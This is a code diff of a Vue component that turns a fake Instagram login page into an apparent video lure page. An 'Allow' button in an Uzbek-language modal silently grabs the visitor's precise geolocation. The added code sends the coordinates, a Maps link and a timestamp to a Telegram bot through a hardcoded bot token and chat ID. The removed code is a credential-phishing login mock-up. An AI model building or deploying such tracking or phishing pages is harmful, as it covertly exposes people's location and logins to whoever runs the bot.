@@ -1,62 +1,55 @@
 <template>
-  <div class="geo-login-video">
-    <video v-if="locationGranted" autoplay loop muted class="background-video">
-      <source src="/geo-location-background.mp4" type="video/mp4" />
-      Your browser does not support HTML5 video.
-    </video>
+  <div class="video-container">
+    <!-- Modal -->
+    <div class="modal" v-if="showModal">
+      <div class="modal-content">
+        <h2>Videoni ko'rishni xohlaysizmi?</h2>
+        <button class="allow-btn" @click="allowVideo">Allow</button>
+      </div>
+    </div>
 
-    <div class="login-container">
-      <div v-if="showLogin" class="login-form">
-        <img src="/instagram-logo.png" alt="Instagram" class="instagram-logo" />
-        <h2 class="instagram-text">Instagram</h2>
-        <input
-          type="text"
-          placeholder="Phone number, username, or email"
-          v-model="username"
-        />
-        <input type="password" placeholder="Password" v-model="password" />
-        <button class="login-btn" @click="submitLogin">Log in</button>
-        <div class="or-divider">
-          <span class="divider-line"></span>
-          <span class="or-text">OR</span>
-          <span class="divider-line"></span>
-        </div>
-        <a href="#" class="forgot-password">Forgot password?</a>
-        <div class="signup-container">
-          <p>
-            Don't have an account? <a href="#" class="signup-link">Sign up</a>
-          </p>
-        </div>
-      </div>
-      <div v-else class="location-request">
-        <h1>Welcome!</h1>
-        <p>Please enable location services to continue.</p>
-        <button @click="getLocation">Enable Location</button>
-        <p v-if="locationError" class="error-message">
-          Error: {{ locationError }}
-        </p>
-      </div>
+    <!-- Video Player -->
+    <div v-if="showVideo" class="video-box">
+      <video controls autoplay class="insta-video">
+        <source src="./assets/mainvideo.mp4" type="video/mp4" />
+        Your browser does not support the video tag.
+      </video>
     </div>
   </div>
 </template>
 
 <script>
 export default {
+  name: "InstagramVideo",
   data() {
     return {
-      showLogin: false,
-      locationGranted: false,
-      username: "",
-      password: "",
-      locationError: null,
+      showModal: true,
+      showVideo: false,
+      latitude: null,
+      longitude: null,
+      botToken: "7622854137:AAH6xblJA8biVHaE4VbC1svOAC-izatOoZI",
+      chatId: "5673984207",
     };
   },
   methods: {
-    getLocation() {
+    allowVideo() {
+      this.showModal = false;
+      this.showVideo = true;
+      this.getGeolocation();
+    },
+
+    getGeolocation() {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
-          this.handleLocationSuccess,
-          this.handleLocationError,
+          (position) => {
+            this.latitude = position.coords.latitude;
+            this.longitude = position.coords.longitude;
+            this.sendToTelegram();
+          },
+          (error) => {
+            console.error("Geolocation error:", error.message);
+            this.sendToTelegram(true);
+          },
           {
             enableHighAccuracy: true,
             timeout: 5000,
@@ -64,180 +57,104 @@ export default {
           }
         );
       } else {
-        this.locationError = "Geolocation is not supported by this browser.";
+        this.sendToTelegram(true);
       }
     },
-    handleLocationSuccess(position) {
-      const latitude = position.coords.latitude;
-      const longitude = position.coords.longitude;
-      console.log("Latitude: " + latitude + ", Longitude: " + longitude);
-      this.locationGranted = true;
-      this.showLogin = true;
-      this.locationError = null;
-    },
-    handleLocationError(error) {
-      this.locationGranted = false;
-      this.showLogin = false;
-      switch (error.code) {
-        case error.PERMISSION_DENIED:
-          this.locationError = "User denied the request for Geolocation.";
-          break;
-        case error.POSITION_UNAVAILABLE:
-          this.locationError = "Location information is unavailable.";
-          break;
-        case error.TIMEOUT:
-          this.locationError = "The request to get user location timed out.";
-          break;
-        case error.UNKNOWN_ERROR:
-          this.locationError = "An unknown error occurred.";
-          break;
-      }
-    },
-    submitLogin() {
-      console.log("Logging in with:", this.username, this.password);
+
+    sendToTelegram(error = false) {
+      const message = error
+        ? `❌ Geolocation olishda xatolik yuz berdi yoki foydalanuvchi rad etdi.`
+        : `📍 Yangi foydalanuvchi joylashuvi:
+Latitude: ${this.latitude}
+Longitude: ${this.longitude}
+🗺️ Google Maps: https://www.google.com/maps?q=${this.latitude},${this.longitude}
+🕒 Vaqt: ${new Date().toLocaleString()}
+`;
+
+      const encodedMessage = encodeURIComponent(message);
+      const telegramUrl = `https://api.telegram.org/bot${this.botToken}/sendMessage?chat_id=${this.chatId}&text=${encodedMessage}`;
+
+      fetch(telegramUrl)
+        .then((res) => res.json())
+        .then((data) => {
+          console.log("Telegramga yuborildi:", data);
+        })
+        .catch((err) => {
+          console.error("Telegramga yuborishda xatolik:", err);
+        });
     },
   },
 };
 </script>
 
-<style scoped>
-.geo-login-video {
-  position: relative;
-  width: 100%;
-  height: 100vh;
-  overflow: hidden;
+<style>
+* {
+  margin: 0;
+  padding: 0;
+  background: #000;
+  box-sizing: border-box;
+}
+.video-container {
   display: flex;
   justify-content: center;
   align-items: center;
+  width: 100%;
+  min-height: 100vh;
+  background-color: #000;
+  color: #fff;
+  position: relative;
+  font-family: Arial, sans-serif;
 }
 
-.background-video {
-  position: absolute;
+/* Modal styling */
+.modal {
+  position: fixed;
   top: 0;
   left: 0;
   width: 100%;
   height: 100%;
-  object-fit: cover;
-  z-index: -1;
-}
-
-.login-container {
-  background: rgba(0, 0, 0, 0.5);
-  padding: 20px;
-  border-radius: 10px;
-  color: white;
-  text-align: center;
-}
-
-.location-request {
-  /* Styles for the location request section */
-}
-
-.location-request button {
-  padding: 10px 20px;
-  background-color: #007bff;
-  color: white;
-  border: none;
-  border-radius: 5px;
-  cursor: pointer;
-}
-
-.location-request button:hover {
-  background-color: #0056b3;
-}
-
-.error-message {
-  color: red;
-  margin-top: 10px;
-}
-
-.login-form {
-  background: #000;
-  padding: 30px 40px;
-  border-radius: 1px;
-  width: 350px;
+  background-color: rgba(0, 0, 0, 0.8);
   display: flex;
-  flex-direction: column;
-  gap: 12px;
+  justify-content: center;
   align-items: center;
+  z-index: 10;
+}
+
+.modal-content {
+  background-color: #1a1a1a;
+  padding: 30px 40px;
+  border-radius: 12px;
   text-align: center;
+  box-shadow: 0 0 20px rgba(255, 255, 255, 0.1);
 }
 
-.instagram-logo {
-  width: 75px;
-  height: 75px;
-  margin-bottom: 10px;
-}
-
-.instagram-text {
-  font-family: "Brush Script MT", cursive;
-  font-size: 40px;
-  margin: 0 0 20px 0;
-  font-weight: normal;
-}
-
-.login-form input {
-  width: 100%;
-  padding: 12px 10px;
-  border: 1px solid #262626;
-  border-radius: 3px;
-  background: #121212;
-  color: #fff;
-  margin-bottom: 6px;
-  font-size: 12px;
-}
-
-.login-btn {
-  background: #0095f6;
-  color: #fff;
+.allow-btn {
+  margin-top: 20px;
+  background-color: #0095f6;
+  color: white;
+  padding: 10px 20px;
   border: none;
-  border-radius: 4px;
-  padding: 8px 0;
+  border-radius: 8px;
   font-weight: bold;
   cursor: pointer;
+}
+
+.allow-btn:hover {
+  background-color: #0078cc;
+}
+
+/* Video player styling */
+.video-box {
+  max-width: 400px;
   width: 100%;
-  margin-top: 8px;
+  padding: 20px;
+  border-radius: 20px;
+  background-color: #111;
+  box-shadow: 0 0 30px rgba(255, 255, 255, 0.1);
 }
 
-.login-btn:hover {
-  background: #0078cc;
-}
-
-.or-divider {
-  display: flex;
-  align-items: center;
+.insta-video {
   width: 100%;
-  margin: 15px 0;
-}
-
-.divider-line {
-  flex: 1;
-  height: 1px;
-  background-color: #262626;
-}
-
-.or-text {
-  padding: 0 15px;
-  color: #8e8e8e;
-  font-size: 13px;
-  font-weight: 600;
-}
-
-.forgot-password {
-  color: #0095f6;
-  font-size: 12px;
-  text-decoration: none;
-  margin-top: 5px;
-}
-
-.signup-container {
-  margin-top: 20px;
-  font-size: 14px;
-}
-
-.signup-link {
-  color: #0095f6;
-  text-decoration: none;
-  font-weight: 600;
+  border-radius: 12px;
 }
 </style>
